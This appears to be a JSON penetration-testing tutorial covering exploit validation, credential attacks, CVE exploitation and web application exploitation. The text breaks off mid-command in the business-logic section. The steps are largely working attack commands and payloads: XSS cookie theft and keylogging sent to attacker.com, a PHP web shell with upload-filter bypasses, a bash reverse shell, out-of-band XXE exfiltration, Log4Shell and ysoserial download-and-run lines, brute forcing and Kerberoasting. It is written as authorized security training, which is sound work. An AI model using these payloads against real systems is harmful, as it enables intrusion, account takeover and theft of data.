{
  "id": "exploitation",
  "title": "Exploitation",
  "description": "Comprehensive exploitation methodology covering safe validation, credential testing, CVE exploitation, and web application attacks",
  "type": "tutorial",
  "steps": [
    {
      "id": "safe_exploit_validation",
      "title": "Safe exploit validation",
      "content": "OBJECTIVE: Verify identified vulnerabilities through controlled proof-of-concept exploitation while minimizing risk of system damage or service disruption.\n\nACADEMIC BACKGROUND:\nThis step aligns with PTES Technical Guidelines Section 3.6 (Exploitation) and OWASP Testing Guide principles of controlled testing. MITRE ATT&CK Initial Access tactics (T1190) documents exploitation techniques. NIST SP 800-115 Section 8.1 emphasizes safe exploitation methodology. The rules of engagement and scope documents define acceptable exploitation boundaries per PCI DSS penetration testing guidance.\n\nSTEP-BY-STEP PROCESS:\n\n1. Pre-Exploitation Risk Assessment:\n```bash\n# Document vulnerability details:\necho \"Vulnerability: Apache 2.4.49 Path Traversal (CVE-2021-41773)\nTarget: webserver01.target.com:80\nImpact: File disclosure, potential RCE\nExploit Availability: Public (Metasploit, ExploitDB)\nRisk Level: MEDIUM (read-only file access, no write/execute)\nMitigation: Verify in isolated VM first\nRollback: No persistence, read-only operation\nAuthorization: Written approval from CTO dated 2025-11-01\" > exploitation_plan.txt\n\n# Classify exploitation risks:\n# LOW: Information disclosure, read-only file access\n# MEDIUM: Write access, configuration changes (reversible)\n# HIGH: Code execution, service interruption, data modification\n# CRITICAL: Destructive operations, irreversible changes\n```\n\n2. Lab Environment Validation:\n```bash\n# Create isolated test environment:\n# Deploy vulnerable application in Docker/VM:\ndocker run -d -p 8080:80 vulnerables/cve-2021-41773\n\n# Test exploit in lab first:\ncurl --path-as-is 'http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'\n\n# Verify exploit behavior:\n# - Success indicators (file contents returned)\n# - Failure modes (error messages, crashes)\n# - Side effects (log entries, service impact)\n# - Cleanup requirements\n\n# Document lab results:\necho \"Lab Test Results:\nExploit: CVE-2021-41773 PoC\nSuccess: YES - /etc/passwd retrieved\nSide Effects: Access log entry only\nService Impact: None\nCleanup: No artifacts created\nSafe for Production: YES\" > lab_validation.txt\n```\n\n3. Production Exploitation Planning:\n```bash\n# Define exploitation scope and limits:\n# - Target systems (specific IPs/hostnames only)\n# - Allowed actions (read-only, no modifications)\n# - Forbidden actions (no data exfiltration of PII, no service disruption)\n# - Time windows (business hours vs off-hours)\n# - Escalation procedures if issues arise\n\n# Create exploitation checklist:\necho \"Pre-Exploitation Checklist:\n[ ] Written authorization obtained\n[ ] Backup verification completed\n[ ] Change control ticket filed\n[ ] Monitoring team notified\n[ ] Emergency contacts verified\n[ ] Lab testing successful\" > exploitation_checklist.txt\n\n# Prepare monitoring:\n# Monitor target system resources during exploitation:\n# - CPU usage\n# - Memory consumption\n# - Disk I/O\n# - Network traffic\n# - Service availability\n```\n\n4. Controlled Exploitation Execution:\n```bash\n# Execute with safety checks:\n# Start with least invasive techniques\n# Monitor system behavior continuously\n# Stop immediately if unexpected behavior occurs\n\n# Example safe SQL injection (read-only):\nsqlmap -u \"https://target.com/page?id=1\" \\\n  --batch \\\n  --technique=B \\  # Blind SQL injection (less invasive)\n  --no-cast \\      # Avoid type conversions that could cause errors\n  --skip-waf \\     # Avoid triggering security controls\n  --current-db \\   # Only enumerate database name\n  --threads=1 \\    # Single thread to avoid DoS\n  --delay=2         # 2-second delay between requests\n\n# Example safe command injection validation:\n# Test with harmless commands first:\ncurl \"https://target.com/ping?host=127.0.0.1;whoami\"  # Read-only system info\n# Avoid: rm, dd, :(){ :|:& };:, shutdown commands\n\n# Example safe file inclusion:\n# Read non-sensitive files first:\ncurl \"https://target.com/view?file=../../../../etc/hostname\"  # Hostname only\ncurl \"https://target.com/view?file=../../../../etc/issue\"     # OS version\n# Escalate to /etc/passwd only if necessary for PoC\n```\n\n5. Evidence Collection During Exploitation:\n```bash\n# Screenshot capture:\n# Use scrot, gnome-screenshot, or browser dev tools\nscrot -s exploitation_poc.png\n\n# Network traffic capture:\ntcpdump -i eth0 -w exploitation.pcap \"host target.com and port 443\"\n# Later analyze with: tshark -r exploitation.pcap\n\n# Command output preservation:\nscript -c \"sqlmap -u 'https://target.com/page?id=1' --batch --dbs\" exploitation_transcript.txt\n\n# Burp Suite request/response export:\n# Right-click request → Save item\n\n# Video recording for complex exploits:\nrecordmydesktop -o exploitation_demo.ogv\n# Or use: asciinema for terminal recordings\nasciinema rec exploitation.cast\n```\n\n6. Proof-of-Concept Development:\n```bash\n# Create reliable, repeatable PoC scripts:\ncat > poc_sqli.py << 'EOF'\n#!/usr/bin/env python3\nimport requests\n\n# SQL injection PoC for target.com\n# CVE: N/A (custom application)\n# Impact: Database enumeration\n# Risk: LOW (read-only)\n\ndef exploit():\n    url = \"https://target.com/search\"\n    payload = \"' UNION SELECT table_name,null FROM information_schema.tables--\"\n    \n    response = requests.post(url, data={\"q\": payload})\n    \n    if \"users\" in response.text:\n        print(\"[+] SQL injection confirmed\")\n        print(\"[+] Tables enumerated:\", response.text)\n        return True\n    else:\n        print(\"[-] Exploitation failed\")\n        return False\n\nif __name__ == \"__main__\":\n    exploit()\nEOF\nchmod +x poc_sqli.py\n\n# Test PoC reliability (3+ successful runs):\nfor i in {1..3}; do\n    echo \"Test run $i:\"\n    python3 poc_sqli.py\n    sleep 5\ndone\n```\n\n7. Impact Verification:\n```bash\n# Verify exploitation impact matches expectations:\n# For SQLi: Can enumerate databases, tables, extract data\n# For XSS: Can execute JavaScript in victim browser\n# For RCE: Can execute system commands with specific privileges\n# For LFI: Can read files with web server user permissions\n\n# Document actual vs expected impact:\necho \"Impact Assessment:\nExpected: Read /etc/passwd via path traversal\nActual: Successfully read /etc/passwd (10 user accounts)\nPrivilege Level: www-data (web server user)\nData Accessed: System user list (non-sensitive)\nPersistence: None (request-based exploitation)\nLateral Movement Potential: LOW (limited to web server context)\" > impact_assessment.txt\n```\n\n8. Rollback and Cleanup Verification:\n```bash\n# For non-persistent exploits (most web vulnerabilities):\n# - No rollback needed\n# - Verify no artifacts left on server\n# - Check for log entries only\n\n# For persistent exploits (uploaded shells, created accounts):\n# Remove uploaded files:\ncurl -X DELETE https://target.com/uploads/shell.php -H \"Cookie: admin_session\"\n\n# Delete created accounts:\ncurl -X POST https://target.com/api/users/delete -d \"username=test_exploit\"\n\n# Verify cleanup:\ncurl https://target.com/uploads/shell.php  # Should return 404\n```\n\n9. Stakeholder Notification:\n```bash\n# Immediate notification for critical findings:\necho \"SECURITY ALERT\nDate: 2025-11-01 14:30\nSeverity: HIGH\nVulnerability: SQL Injection in /search endpoint\nStatus: VERIFIED via safe exploitation\nImpact: Full database read access\nImmediate Action Required: Deploy input validation patch\nContact: pentester@example.com\" | mail -s \"Critical Vulnerability Verified\" security-team@target.com\n\n# Document in ticketing system:\n# Jira, ServiceNow, or similar\n```\n\n10. Exploitation Lessons Learned:\n```bash\n# Document what worked and what didn't:\necho \"Exploitation Report:\nVulnerabilities Tested: 12\nExploitable: 8\nFalse Positives: 4\nUnexpected Behavior: 1 (timeout on large SQLi payload)\nSafety Incidents: 0\nRecommendations:\n- Add rate limiting for future tests\n- Lab environment accurately represented production\n- Backup verification critical before testing\" > lessons_learned.txt\n```\n\nWHAT TO LOOK FOR:\n- **Reliable Exploitation**: PoC succeeds consistently (3+ times) without system instability\n- **Predictable Impact**: Actual results match expected outcomes from vulnerability analysis\n- **No Collateral Damage**: Exploitation doesn't affect other systems or services\n- **Clean Rollback**: All changes reversible and artifacts removable\n- **Clear Evidence**: Screenshots, logs, traffic captures document successful exploitation\n- **Scope Compliance**: Exploitation stays within approved targets and methods\n- **Safety Checks Effective**: Monitoring detects any anomalies immediately\n\nSECURITY IMPLICATIONS:\n- **Proof of Risk**: Successful exploitation validates business risk assessments\n- **Prioritization Driver**: Demonstrated exploits elevate remediation priority\n- **Incident Response Test**: Tests detection capabilities and response procedures\n- **Compliance Evidence**: Validates security control effectiveness per PCI DSS 11.3, ISO 27001 A.12.6\n- **Insurance Requirements**: Some cyber insurance policies require penetration testing validation\n\nCOMMON PITFALLS:\n- **Unreliable Exploits**: Public exploits may not work against specific versions or configurations\n- **Environment Differences**: Production hardening (WAF, IPS, segmentation) not present in staging\n- **Timing Sensitivity**: Race conditions and timing-based exploits may fail intermittently\n- **Authentication Requirements**: Some exploits require specific authentication states or privileges\n- **False Confidence**: Successful exploitation in lab doesn't guarantee production success\n- **Destructive Testing**: Always verify exploit is non-destructive before production use\n- **Legal Boundaries**: Exceeding scope or authorization can result in criminal liability\n\nTOOLS REFERENCE:\n- **Metasploit Framework**: https://github.com/rapid7/metasploit-framework (Exploitation framework)\n- **ExploitDB**: https://www.exploit-db.com/ (Public exploit database)\n- **Burp Suite**: https://portswigger.net/burp (Web exploitation proxy)\n- **SQLMap**: https://github.com/sqlmapproject/sqlmap (Automated SQL injection)\n- **Docker**: https://www.docker.com/ (Isolated lab environments)\n\nFURTHER READING:\n- PTES Exploitation Guidelines: http://www.pentest-standard.org/index.php/Exploitation\n- NIST SP 800-115 Section 8: Security Assessment Execution\n- OWASP Testing Guide Exploitation: https://owasp.org/www-project-web-security-testing-guide/\n- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/\n- PCI DSS Penetration Testing Guidance: https://www.pcisecuritystandards.org/",
      "tags": ["exploitation", "safe-validation", "poc", "risk-assessment", "evidence-collection"]
    },
    {
      "id": "credential_testing",
      "title": "Credential testing",
      "content": "OBJECTIVE: Validate discovered credentials, test default passwords, and perform controlled brute-force attacks against authentication mechanisms.\n\nACADEMIC BACKGROUND:\nMITRE ATT&CK T1078 (Valid Accounts) and T1110 (Brute Force) document credential-based access techniques. OWASP Testing Guide WSTG-ATHN-01 covers default credentials testing. NIST SP 800-63B Section 5.1.1 addresses password strength requirements. The PTES Technical Guidelines emphasize credential testing as primary exploitation vector.\n\nSTEP-BY-STEP PROCESS:\n\n1. Default Credential Testing:\n```bash\n# Test common default credentials:\n# admin/admin, admin/password, root/toor, admin/Admin123\n# Vendor-specific defaults from documentation\n\n# Automated default credential testing:\nhydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://target.com\n\n# Common default databases:\n# - SecLists: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials\n# - CIRT.net Default Passwords: https://cirt.net/passwords\n# - DefaultCreds-Cheat-Sheet: https://github.com/ihebski/DefaultCreds-cheat-sheet\n\n# Service-specific defaults:\n# Tomcat: admin/tomcat, tomcat/tomcat\n# Jenkins: admin/password\n# Grafana: admin/admin\n# PostgreSQL: postgres/postgres\n# MongoDB: (no password by default)\n```\n\n2. Discovered Credential Validation:\n```bash\n# Test credentials from reconnaissance:\n# - Exposed in public Git repos\n# - Found in leaked database dumps\n# - Extracted from configuration files\n# - Obtained via phishing simulations\n\n# Validate SSH credentials:\nssh user@target.com -p 22\n\n# Test database credentials:\nmysql -h target.com -u dbuser -p'password' -e \"SELECT version();\"\npsql -h target.com -U postgres -d database -c \"SELECT version();\"\n\n# Web application login:\ncurl -X POST https://target.com/login \\\n  -d \"username=admin&password=discovered_password\" \\\n  -c cookies.txt\n\n# API key validation:\ncurl -H \"Authorization: Bearer <discovered_token>\" https://api.target.com/user/info\n```\n\n3. Password Reuse Testing:\n```bash\n# Test discovered credentials across multiple services:\n# If admin@target.com:Password123 works on web portal,\n# test same credentials on:\n# - SSH (port 22)\n# - FTP (port 21)\n# - SMB (port 445)\n# - RDP (port 3389)\n# - VPN gateway\n# - Cloud services (AWS, Azure, O365)\n\n# Automated credential spraying:\ncrackmapexec smb 192.168.1.0/24 -u admin -p Password123\ncrackmapexec ssh 192.168.1.0/24 -u admin -p Password123\ncrackmapexec winrm 192.168.1.0/24 -u admin -p Password123\n```\n\n4. Brute Force and Password Spraying:\n```bash\n# Password spraying (avoid account lockouts):\n# Use common passwords against many accounts\n# - Password123, Welcome2025, CompanyName2024\n# - Seasonal passwords: Winter2024!, Fall2024!\n\n# Hydra brute force:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com http-post-form \\\n  \"/login:username=^USER^&password=^PASS^:F=Invalid\" -t 4 -w 30\n\n# Medusa brute force:\nmedusa -h target.com -u admin -P passwords.txt -M ssh -t 1 -f\n\n# NMAP NSE brute force:\nnmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com -p 22\n\n# CrackMapExec for SMB:\ncrackmapexec smb target.com -u users.txt -p passwords.txt --continue-on-success\n```\n\n5. Hash Cracking (Offline Attacks):\n```bash\n# Extract password hashes:\n# - Windows: SAM database, NTDS.dit (Active Directory)\n# - Linux: /etc/shadow\n# - Web apps: Database dumps\n# - Network: NTLM/NTLMv2 captured via Responder\n\n# Hashcat hash cracking:\n# NTLM hashes (Windows):\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# SHA-512 (Linux /etc/shadow):\nhashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# bcrypt (web applications):\nhashcat -m 3200 -a 0 web_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# John the Ripper:\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt\njohn --show hashes.txt\n```\n\n6. Kerberoasting (Active Directory):\n```bash\n# Request TGS tickets for service accounts:\n# Requires domain user credentials\n\n# Using Impacket:\nGetUserSPNs.py -request -dc-ip 10.0.0.1 domain.com/user:password\n\n# Crack TGS tickets:\nhashcat -m 13100 -a 0 tgs_tickets.txt /usr/share/wordlists/rockyou.txt\n\n# Using Rubeus (Windows):\n# Rubeus.exe kerberoast /outfile:tickets.txt\n```\n\n7. Token and Session Hijacking:\n```bash\n# Cookie theft via XSS:\n# <script>fetch('http://attacker.com/?c='+document.cookie)</script>\n\n# Session fixation exploitation:\n# 1. Obtain session ID before authentication\n# 2. Authenticate with victim credentials\n# 3. Attacker uses same session ID\n\n# JWT manipulation (algorithm confusion):\n# Change header: {\"alg\":\"RS256\"} → {\"alg\":\"none\"}\n# Remove signature, access admin resources\n```\n\n8. Multi-Factor Authentication Bypass:\n```bash\n# MFA bypass techniques:\n# 1. Backup codes (if leaked or weak)\n# 2. Remember device feature abuse\n# 3. Direct API endpoint access (skip MFA page)\n# 4. OAuth token theft\n# 5. SMS interception (SIM swapping simulation)\n# 6. Push notification fatigue attacks\n\n# Test MFA enforcement:\ncurl -H \"Cookie: session_without_mfa\" https://target.com/dashboard\n# If accessible, MFA bypass confirmed\n```\n\n9. Privilege Verification:\n```bash\n# After successful authentication, verify access level:\n# Linux:\nwhoami\nid\nsudo -l\ngroups\n\n# Windows:\nwhoami /all\nnet user %username%\nnet localgroup administrators\n\n# Web application:\ncurl https://target.com/api/user/me -H \"Cookie: session\"\n# Check returned role/permissions in JSON response\n```\n\n10. Credential Documentation:\n```bash\n# Document all validated credentials:\necho \"Credential Testing Results:\nUsername: admin@target.com\nPassword: Password123!\nService: Web Portal (https://target.com)\nAccess Level: Administrator\nPrivilege: Full system access\nSource: Default credentials (unchanged)\nReuse: SSH (port 22) ✓, FTP (port 21) ✓\nRecommendations: Enforce password change, enable MFA\" > credentials_report.txt\n```\n\nWHAT TO LOOK FOR:\n- **Default Credentials**: Unchanged vendor passwords providing immediate access\n- **Weak Passwords**: Dictionary words, company names, seasonal patterns (Winter2024)\n- **Password Reuse**: Same credentials working across multiple services\n- **Missing Lockout**: Unlimited authentication attempts without account locks\n- **Crackable Hashes**: Weak hashing algorithms (MD5, SHA1) or short passwords\n- **MFA Gaps**: Backup methods, remember device, or direct endpoint bypass\n- **Service Accounts**: High-privilege accounts with weak or no passwords\n- **Shared Accounts**: Generic usernames (admin, test, support) with known passwords\n\nSECURITY IMPLICATIONS:\n- **Immediate Access**: Valid credentials provide authorized entry, bypassing most security controls\n- **Lateral Movement**: Credential reuse enables access to multiple systems\n- **Persistence**: Valid accounts harder to detect than malware or exploits\n- **Privilege Escalation**: Admin credentials grant full system control\n- **Compliance Violations**: Weak passwords breach PCI DSS 8.2, NIST 800-63B, ISO 27001 A.9.4\n\nCOMMON PITFALLS:\n- **Account Lockouts**: Aggressive brute-forcing triggers lockout policies\n- **Alerting**: Failed authentication attempts generate security alerts\n- **Rate Limiting**: Password spraying blocked by rate limits or WAF\n- **MFA Enforcement**: Multi-factor authentication blocks credential-only access\n- **Intentional Honeypots**: Some weak accounts are monitoring traps\n- **Legal Concerns**: Unauthorized access via guessed passwords still illegal\n\nTOOLS REFERENCE:\n- **Hydra**: https://github.com/vanhauser-thc/thc-hydra (Network brute force)\n- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec (SMB/SSH/WinRM testing)\n- **Hashcat**: https://hashcat.net/hashcat/ (Hash cracking)\n- **John the Ripper**: https://www.openwall.com/john/ (Password cracking)\n- **Impacket**: https://github.com/fortra/impacket (Kerberos and SMB tools)\n- **SecLists**: https://github.com/danielmiessler/SecLists (Password lists)\n\nFURTHER READING:\n- OWASP Testing Guide WSTG-ATHN: https://owasp.org/www-project-web-security-testing-guide/\n- MITRE ATT&CK T1110 Brute Force: https://attack.mitre.org/techniques/T1110/\n- NIST SP 800-63B Digital Identity Guidelines: https://pages.nist.gov/800-63-3/\n- Password Cracking Best Practices: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions",
      "tags": ["credential-testing", "brute-force", "password-cracking", "default-credentials", "authentication"]
    },
    {
      "id": "cve_exploitation",
      "title": "CVE exploitation",
      "content": "OBJECTIVE: Exploit identified Common Vulnerabilities and Exposures (CVEs) using public proof-of-concept code and exploitation frameworks.\n\nACADEMIC BACKGROUND:\nMITRE ATT&CK T1203 (Exploitation for Client Execution) and T1210 (Exploitation of Remote Services) document CVE exploitation patterns. NIST SP 800-115 Section 8.2 addresses vulnerability exploitation methodology. The Exploit Prediction Scoring System (EPSS) helps prioritize CVE exploitation likelihood.\n\nSTEP-BY-STEP PROCESS:\n\n1. CVE Exploit Research:\n```bash\n# Search Exploit-DB:\nsearchsploit Apache 2.4.49\nsearchsploit --cve CVE-2021-41773\nsearchsploit --examine exploits/linux/webapps/50383.py\n\n# Metasploit Framework search:\nmsfconsole -q -x \"search cve:2021-41773\"\nmsfconsole -q -x \"search type:exploit platform:linux apache\"\n\n# GitHub exploit search:\n# https://github.com/search?q=CVE-2021-41773&type=repositories\n```\n\n2. Exploit Adaptation and Testing:\n```bash\n# Download exploit from ExploitDB:\nsearchsploit -m exploits/linux/webapps/50383.py\n# Review code for hardcoded IPs, required modifications\n\n# Test in lab environment first:\npython3 50383.py --target http://lab.internal:8080 --command \"id\"\n\n# Metasploit module usage:\nmsfconsole\nuse exploit/linux/http/apache_normalize_path_rce\nset RHOSTS target.com\nset LHOST attacker_ip\nset LPORT 4444\ncheck   # Verify vulnerability before exploitation\nexploit\n```\n\n3. Remote Code Execution (RCE) Exploitation:\n```bash\n# Log4Shell (CVE-2021-44228):\ncurl -H \"X-Api-Version: ${jndi:ldap://attacker.com:1389/Exploit}\" https://target.com/api\n\n# Apache Struts (CVE-2017-5638):\n# Content-Type: %{(#_='multipart/form-data')...}\n\n# Shellshock (CVE-2014-6271):\ncurl -H \"User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'\" https://target.com/cgi-bin/test.cgi\n\n# ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207):\n# Exploit Microsoft Exchange Server\n```\n\n4. Privilege Escalation CVEs:\n```bash\n# Linux kernel exploits:\n# DirtyCOW (CVE-2016-5195):\ngcc -pthread dirty.c -o dirty -lcrypt\ndirty password  # Creates firefart user with root privileges\n\n# Sudo vulnerability (CVE-2021-3156 - Baron Samedit):\nsudoedit -s /\n# Grants root shell on vulnerable sudo versions\n\n# Windows privilege escalation:\n# PrintSpooler (CVE-2021-1675 - PrintNightmare):\n# Loads malicious DLL as SYSTEM\n```\n\n5. Exploit Reliability Testing:\n```bash\n# Test exploit 3+ times for reliability:\nfor i in {1..5}; do\n    echo \"Attempt $i:\"\n    python3 exploit.py --target https://target.com\n    sleep 10\ndone\n\n# Document success rate:\n# 5/5 successful: Reliable\n# 3/5 successful: Moderate reliability\n# 1/5 successful: Unreliable (environment-specific)\n```\n\n6. Exploitation with Metasploit Framework:\n```bash\n# Full Metasploit exploitation workflow:\nmsfconsole -q\n\n# Search for exploits:\nsearch cve:2021\n\n# Select exploit:\nuse exploit/multi/http/log4shell_header_injection\nshow options\nset RHOSTS target.com\nset LHOST attacker_ip\nset LPORT 4444\n\n# Set payload:\nset payload linux/x64/meterpreter/reverse_tcp\n\n# Verify target is vulnerable:\ncheck\n\n# Execute exploit:\nexploit -j  # Run as job (background)\n```\n\n7. Post-Exploitation Commands:\n```bash\n# After gaining shell access:\n# System information:\nuname -a\ncat /etc/os-release\nwhoami\nid\n\n# Network reconnaissance:\nifconfig\nip addr\nnetstat -antup\n\n# Privilege verification:\nsudo -l\ncat /etc/sudoers\n\n# Persistence (if authorized):\n# SSH key installation, cron jobs, systemd services\n```\n\n8. Evidence Collection:\n```bash\n# Capture exploitation proof:\nscript -c \"msfconsole\" exploitation_session.txt\n# Screenshot showing id, uname, and access confirmation\n\n# Network traffic:\ntcpdump -i eth0 -w cve_exploitation.pcap \"host target.com\"\n\n# Document exploitation chain:\necho \"CVE Exploitation Report:\nCVE: CVE-2021-41773\nVulnerability: Apache Path Traversal\nExploit Source: ExploitDB 50383\nExploit Success: YES (5/5 attempts)\nAccess Gained: www-data user on webserver01\nCommands Executed: id, uname -a, cat /etc/passwd\nPersistence: None (session-based only)\" > cve_report.txt\n```\n\n9. Failure Analysis:\n```bash\n# Common exploitation failure reasons:\n# - Target not vulnerable (patched or different version)\n# - WAF/IPS blocking exploit traffic\n# - Network conditions (firewalls, NAT, routing)\n# - Exploit requires specific configuration\n# - Antivirus/EDR detecting exploit\n\n# Document failures:\necho \"Failed Exploitation Attempts:\nCVE: CVE-2019-0708 (BlueKeep)\nTarget: Windows Server 2019\nResult: FAILED - Target patched (KB4499175)\nCVE: CVE-2021-44228 (Log4Shell)\nTarget: Application server\nResult: FAILED - WAF blocking JNDI lookups\" > failed_exploits.txt\n```\n\n10. Ethical Exploitation Guidelines:\n```bash\n# Always follow rules of engagement:\n# - Only exploit systems in scope\n# - Stop immediately if instability detected\n# - Don't exfiltrate sensitive data\n# - Don't create backdoors without authorization\n# - Document all actions for client transparency\n```\n\nWHAT TO LOOK FOR:\n- **Publicly Available Exploits**: Metasploit modules, ExploitDB entries, GitHub PoCs\n- **High-Reliability CVEs**: Exploits that work consistently across versions\n- **Remote Code Execution**: Highest impact vulnerabilities providing shell access\n- **Privilege Escalation Chains**: Combining user-level RCE with local privesc\n- **No User Interaction**: Vulnerabilities exploitable without victim actions\n- **Wormable Vulnerabilities**: Self-propagating exploits (EternalBlue, BlueKeep)\n\nSECURITY IMPLICATIONS:\n- **Rapid Compromise**: Public CVE exploits enable mass exploitation by threat actors\n- **Ransomware Delivery**: RCE vulnerabilities primary vector for ransomware deployment\n- **Supply Chain Risk**: Library vulnerabilities (Log4j) affect thousands of applications\n- **Compliance Violations**: Unpatched critical CVEs breach PCI DSS 6.2, NIST 800-53 SI-2\n\nCOMMON PITFALLS:\n- **Exploit Fragility**: Public exploits may be unreliable or crash systems\n- **Version Specificity**: Exploits often target specific software versions\n- **Detection**: IDS/IPS signatures exist for popular CVE exploits\n- **Legal Risk**: Unauthorized CVE exploitation constitutes computer intrusion\n\nTOOLS REFERENCE:\n- **Metasploit**: https://github.com/rapid7/metasploit-framework\n- **searchsploit**: https://github.com/offensive-security/exploitdb\n- **Nuclei**: https://github.com/projectdiscovery/nuclei (CVE detection)\n- **PoC-in-GitHub**: https://github.com/nomi-sec/PoC-in-GitHub\n\nFURTHER READING:\n- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/\n- PTES Exploitation: http://www.pentest-standard.org/index.php/Exploitation\n- MITRE ATT&CK Exploitation: https://attack.mitre.org/tactics/TA0002/",
      "tags": ["cve-exploitation", "metasploit", "exploitdb", "rce", "privilege-escalation"]
    },
    {
      "id": "web_application_exploitation",
      "title": "Web application exploitation",
      "content": "OBJECTIVE: Exploit web application vulnerabilities including SQL injection, XSS, file upload flaws, and business logic issues to demonstrate real-world impact.\n\nACADEMIC BACKGROUND:\nThis step implements OWASP Top 10:2021 exploitation including A03 (Injection), A01 (Broken Access Control), A04 (Insecure Design). MITRE ATT&CK T1190 (Exploit Public-Facing Application) documents web exploitation tactics. PTES Web Application Testing methodology provides comprehensive exploitation guidance.\n\nSTEP-BY-STEP PROCESS:\n\n1. SQL Injection Exploitation for Data Extraction:\n```bash\n# Manual SQL injection data extraction:\n# Enumerate databases:\n' UNION SELECT schema_name FROM information_schema.schemata--\n\n# Enumerate tables:\n' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database'--\n\n# Extract data:\n' UNION SELECT username,password FROM users--\n\n# Automated with SQLMap:\nsqlmap -u \"https://target.com/product?id=1\" --batch --dump -D database -T users\n\n# Boolean-based blind extraction:\nsqlmap -u \"https://target.com/search?q=test\" --batch --technique=B --threads=10\n\n# File read via SQL injection:\n' UNION SELECT LOAD_FILE('/etc/passwd')--\nsqlmap -u \"https://target.com/page?id=1\" --file-read=\"/var/www/html/config.php\"\n\n# Command execution (if database has permissions):\n'; EXEC xp_cmdshell('whoami')--  # MSSQL\n' UNION SELECT sys_eval('id')--  # MySQL with UDF\nsqlmap -u \"https://target.com/page?id=1\" --os-shell\n```\n\n2. Cross-Site Scripting (XSS) Exploitation:\n```bash\n# Stored XSS for session hijacking:\n<script>fetch('http://attacker.com/?c='+document.cookie)</script>\n<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie;</script>\n\n# Setup listener on attacker server:\npython3 -m http.server 8080\n\n# Keylogger XSS payload:\n<script>\ndocument.onkeypress = function(e) {\n    fetch('http://attacker.com/log?key=' + e.key);\n}\n</script>\n\n# BeEF Framework integration:\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n# Access BeEF control panel: http://localhost:3000/ui/panel\n\n# DOM-based XSS exploitation:\n# If page uses: document.location.href = '#' + decodeURIComponent(hash)\nhttps://target.com/page#<script>alert(document.cookie)</script>\n```\n\n3. File Upload Exploitation:\n```bash\n# PHP web shell upload:\ncat > shell.php << 'EOF'\n<?php system($_GET['cmd']); ?>\nEOF\n\n# Bypass extension filters:\nshell.php.jpg  # Double extension\nshell.php%00.jpg  # Null byte injection\nshell.phtml, shell.php3, shell.php4, shell.php5  # Alternative extensions\n\n# Upload with curl:\ncurl -X POST https://target.com/upload -F \"file=@shell.php\" -F \"submit=Upload\"\n\n# Access uploaded shell:\ncurl \"https://target.com/uploads/shell.php?cmd=id\"\n\n# Reverse shell upgrade:\ncurl \"https://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\"\n\n# Listener on attacker machine:\nnc -lvnp 4444\n```\n\n4. XML External Entity (XXE) Exploitation:\n```bash\n# XXE for file disclosure:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n\n# Out-of-band XXE (exfiltrate data):\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>\n\n# evil.dtd on attacker server:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">\n%eval;\n%exfiltrate;\n\n# XXE to SSRF (scan internal network):\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">]>\n<root>&xxe;</root>\n```\n\n5. Server-Side Request Forgery (SSRF):\n```bash\n# SSRF to access internal services:\n# If application fetches URLs: https://target.com/fetch?url=...\n\n# Access internal network:\ncurl \"https://target.com/fetch?url=http://192.168.1.100\"\n\n# Access cloud metadata (AWS):\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\n# Port scanning via SSRF:\nfor port in {1..1000}; do\n    curl \"https://target.com/fetch?url=http://internal-host:$port\" &\ndone\n\n# SSRF to RCE (Gopher protocol):\ncurl \"https://target.com/fetch?url=gopher://localhost:6379/_SET%20test%20command\"\n```\n\n6. Local File Inclusion (LFI) to Remote Code Execution:\n```bash\n# LFI with PHP wrappers:\n# Log poisoning:\n# 1. Inject PHP code into access.log via User-Agent:\ncurl -A \"<?php system($_GET['cmd']); ?>\" https://target.com\n\n# 2. Include log file:\ncurl \"https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id\"\n\n# PHP session file inclusion:\n# 1. Store PHP code in session:\ncurl \"https://target.com/index.php?lang=en\" --cookie \"PHPSESSID=malicious\" -d \"username=<?php system('id'); ?>\"\n\n# 2. Include session file:\ncurl \"https://target.com/page?file=../../../../tmp/sess_malicious\"\n\n# /proc/self/environ inclusion:\ncurl \"https://target.com/page?file=../../../../proc/self/environ\" -H \"User-Agent: <?php system('id'); ?>\"\n```\n\n7. Insecure Deserialization Exploitation:\n```bash\n# PHP object injection:\n# Serialized object: O:4:User:1:{s:4:role;s:5:admin;}\n# Base64 encoded value\n\n# Java deserialization (ysoserial):\njava -jar ysoserial.jar CommonsCollections5 'wget http://attacker.com/shell.sh | bash' | base64\n\n# Python pickle injection demonstrates RCE via deserialization\n# Creates exploit object that executes system commands when unpickled\n```\n\n8. Business Logic Exploitation:\n```bash\n# Price manipulation:\n# POST /checkout\n# {\"product_id\": 123, \"quantity\": 1, \"price\": 0.01}\n\n# Workflow bypass:\n# Skip payment step, go directly to order confirmation:\ncurl -X POST https://target.com/order/confirm -d 